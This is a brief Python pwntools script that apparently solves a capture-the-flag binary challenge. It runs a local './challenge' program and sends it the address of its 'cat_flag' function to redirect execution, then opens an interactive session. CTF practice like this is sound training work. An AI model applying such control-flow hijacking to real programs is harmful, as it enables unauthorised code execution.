#!/usr/bin/python3

from pwn import *
io=process("./challenge")
elf=ELF("./challenge")
target =str(hex(elf.sym.cat_flag))

io.sendline(target)
io.interactive()
io.close()
